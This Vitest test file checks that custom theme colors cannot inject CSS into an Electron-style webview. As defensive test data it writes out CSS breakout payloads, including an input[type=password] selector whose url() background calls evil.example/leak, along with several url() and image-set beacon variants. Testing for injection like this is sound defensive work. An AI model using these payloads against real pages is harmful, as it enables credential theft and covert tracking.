import { describe, it, expect } from 'vitest';
import { webviewThemeCSS, webviewThemeJS, isSafeThemeTokenValue } from './webviewTheme';
import { resolveTheme } from '../themes';

// A custom theme's colors ride in from `config.ui.customThemes`, which a
// non-host bus caller (plugin / remote / web / MCP facade) can write. Both
// `usePluginWebview` and `BrowserPane` inject `webviewThemeCSS(...)` into a
// <webview> via `insertCSS` — and BrowserPane's webview may be showing a
// third-party origin (accounts.google.com). `insertCSS` does no validation, so
// a color value that terminates `:root{}` and opens its own selector becomes a
// live rule in the guest document: an [type=password] attribute selector with a
// `url()` background is silent credential exfil.
describe('webviewThemeCSS refuses to let a theme value inject CSS into a webview', () => {
  const payload =
    '#fff; } input[type=password] { background: url(https://evil.example/leak) } :root { --x: #000';

  it('drops a color value that breaks out of :root{}', () => {
    const theme = resolveTheme('custom:evil', {
      'custom:evil': { name: 'evil', base: 'dark', colors: { accent: payload } as any },
    });
    const css = webviewThemeCSS(theme);
    expect(
      css,
      'a custom color value closed :root{} and injected a live selector into the webview document',
    ).not.toContain('input[type=password]');
    expect(css).not.toContain('evil.example');
    // FLOOR: a legitimate theme still emits its tokens.
    const ok = webviewThemeCSS(resolveTheme('dark'));
    expect(ok).toContain('--wks-accent:');
    expect(ok).toContain('--wks-bg-base:');
  });

  it('the value guard accepts real token shapes and rejects breakouts', () => {
    for (const good of [
      '#0a0a0a',
      'rgba(255, 255, 255, 0.16)',
      '18px',
      '0 4px 12px rgba(0,0,0,0.5)',
    ]) {
      expect(isSafeThemeTokenValue(good), `rejected a legitimate token value: ${good}`).toBe(true);
    }
    for (const bad of [
      '#fff; }',
      'red } body{}',
      '#000; color: green',
      'url(x) /* comment */',
      '#000 @import "evil"',
      'a\\65 b',
      // url() beacons that carry NO breakout character — caught by CSS_FETCH,
      // not CSS_BREAKOUT. Consumed as `background: var(--wks-bg-base)` these
      // fire an outbound GET on guest render with no user action.
      'url(https://evil.example/beacon.png)',
      'url(//evil.example/b)',
      'URL(https://evil.example/x)',
      'image-set("https://evil.example/x" 1x)',
      '-webkit-image-set(url(https://evil.example/x) 1x)',
      'cross-fade(url(https://evil.example/a), url(https://evil.example/b))',
      'image(https://evil.example/x)',
    ]) {
      expect(isSafeThemeTokenValue(bad), `accepted a beacon/breakout value: ${bad}`).toBe(false);
    }
  });

  // A url() beacon planted on bgBase must not survive into the injected CSS —
  // `:where(html, body){ background: var(--wks-bg-base) }` would fetch it on
  // render in a plugin OR third-party-origin (BrowserPane) webview, no user
  // action. Sibling of the credential-selector breakout above, one value-shape
  // over: it stays inside :root{} but still causes an outbound request.
  it('drops a url() beacon planted on a consumed token (bgBase)', () => {
    const beacon = 'url(https://evil.example/beacon.png)';
    const theme = resolveTheme('custom:beacon', {
      'custom:beacon': { name: 'beacon', base: 'dark', colors: { bgBase: beacon } as any },
    });
    const css = webviewThemeCSS(theme);
    expect(
      css,
      'a url() token survived into injected webview CSS as a background beacon',
    ).not.toContain('evil.example');
    expect(css).not.toContain('url(');
    // FLOOR: the injected rule that would consume the beacon still exists, and a
    // legitimate theme still emits a real bgBase token.
    expect(css).toContain('background: var(--wks-bg-base)');
    expect(webviewThemeCSS(resolveTheme('dark'))).toContain('--wks-bg-base:');
  });

  // The JS twin uses JSON.stringify, which keeps the payload a string literal in
  // the executeJavaScript context — it cannot break out. Pinned so a refactor
  // that switches to string concatenation is caught.
  it('the JS payload keeps a hostile value a string literal', () => {
    const theme = resolveTheme('custom:evil', {
      'custom:evil': { name: 'evil', base: 'dark', colors: { accent: payload } as any },
    });
    const js = webviewThemeJS(theme);
    // The value survives, but only inside a JSON string — no bare `}` that would
    // close the IIFE or a statement.
    expect(js).toContain(JSON.stringify(payload).slice(1, -1).slice(0, 10));
    expect(() => new Function(js)).not.toThrow();
  });
});
